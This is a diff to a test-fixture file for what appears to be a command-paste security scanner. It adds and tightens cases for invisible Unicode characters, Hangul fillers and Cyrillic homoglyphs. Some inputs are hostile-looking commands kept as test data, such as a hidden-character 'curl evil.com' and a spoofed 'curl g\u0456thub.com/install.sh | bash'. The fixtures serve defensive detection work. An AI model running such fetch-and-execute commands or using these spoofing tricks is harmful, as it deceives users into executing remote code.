@@ -257,7 +257,7 @@ name = "variation_selector_paste"
 min_milestone = 2
 input = "A"
 context = "paste"
-expected_action = "allow"
+expected_action = "warn"
 expected_rules = ["variation_selector"]
 raw_bytes = [65, 239, 184, 143]
 
@@ -307,12 +307,39 @@ expected_rules = ["zero_width_chars"]
 raw_bytes = [99, 117, 114, 226, 129, 160, 108, 32, 101, 118, 105, 108, 46, 99, 111, 109]
 
 [[fixture]]
+name = "mongolian_vowel_separator_paste"
+min_milestone = 4
+input = "curl evil.com"
+context = "paste"
+expected_action = "block"
+expected_rules = ["zero_width_chars"]
+raw_bytes = [99, 117, 114, 225, 160, 142, 108, 32, 101, 118, 105, 108, 46, 99, 111, 109]
+
+[[fixture]]
 name = "invisible_whitespace_exec"
 min_milestone = 2
 input = "echo\u2009hello"
 context = "exec"
 expected_action = "warn"
 expected_rules = ["invisible_whitespace"]
+
+[[fixture]]
+name = "invisible_whitespace_en_space_paste"
+min_milestone = 4
+input = "echo hello"
+context = "paste"
+expected_action = "warn"
+expected_rules = ["invisible_whitespace"]
+raw_bytes = [101, 99, 104, 111, 226, 128, 130, 104, 101, 108, 108, 111]
+
+[[fixture]]
+name = "invisible_whitespace_medium_math_paste"
+min_milestone = 4
+input = "echo hello"
+context = "paste"
+expected_action = "warn"
+expected_rules = ["invisible_whitespace"]
+raw_bytes = [101, 99, 104, 111, 226, 129, 159, 104, 101, 108, 108, 111]
 
 [[fixture]]
 name = "invisible_math_operator_exec"
@@ -327,7 +354,7 @@ name = "variation_selector_exec"
 min_milestone = 2
 input = "A\uFE01"
 context = "exec"
-expected_action = "allow"
+expected_action = "warn"
 expected_rules = ["variation_selector"]
 
 [[fixture]]
@@ -335,7 +362,7 @@ name = "variation_selector_supplementary_paste"
 min_milestone = 2
 input = "A"
 context = "paste"
-expected_action = "allow"
+expected_action = "warn"
 expected_rules = ["variation_selector"]
 raw_bytes = [65, 243, 160, 132, 128]
 
@@ -367,3 +394,79 @@ context = "paste"
 expected_action = "block"
 expected_rules = ["zero_width_chars"]
 raw_bytes = [99, 117, 114, 226, 128, 141, 108, 32, 101, 118, 105, 108, 46, 99, 111, 109]
+
+# ─── Part 4: Steg detection hardening ───
+
+[[fixture]]
+name = "hangul_filler_paste"
+min_milestone = 4
+input = "echo hello"
+context = "paste"
+expected_action = "warn"
+expected_rules = ["hangul_filler"]
+raw_bytes = [101, 99, 104, 111, 227, 133, 164, 104, 101, 108, 108, 111]
+
+[[fixture]]
+name = "hangul_filler_exec"
+min_milestone = 4
+input = "echo\u3164hello"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["hangul_filler"]
+
+[[fixture]]
+name = "confusable_text_cyrillic_in_ascii"
+min_milestone = 4
+input = "curl g\u0456thub.com/install.sh | bash"
+context = "paste"
+expected_action = "block"
+expected_rules = ["confusable_text", "curl_pipe_shell"]
+
+[[fixture]]
+name = "confusable_text_math_bold"
+min_milestone = 4
+input = "echo hello"
+context = "paste"
+expected_action = "block"
+expected_rules = ["confusable_text"]
+raw_bytes = [101, 99, 104, 111, 32, 240, 157, 144, 161, 240, 157, 144, 158, 240, 157, 144, 165, 240, 157, 144, 165, 240, 157, 144, 168]
+
+[[fixture]]
+name = "confusable_text_exec"
+min_milestone = 4
+input = "curl g\u0456thub.com"
+context = "exec"
+expected_action = "block"
+expected_rules = ["confusable_text"]
+
+[[fixture]]
+name = "confusable_text_natural_cyrillic"
+min_milestone = 4
+input = "\u041F\u0440\u0438\u0432\u0435\u0442 \u043C\u0438\u0440"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "confusable_text_benign_mixed_note"
+min_milestone = 4
+input = "Note: \u041F\u0440\u0438\u0432\u0435\u0442 \u043C\u0438\u0440"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "confusable_text_benign_mixed_name"
+min_milestone = 4
+input = "name: \u041F\u0440\u0438\u0432\u0435\u0442"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "confusable_text_benign_mixed_exec"
+min_milestone = 4
+input = "echo \u041F\u0440\u0438\u0432\u0435\u0442"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
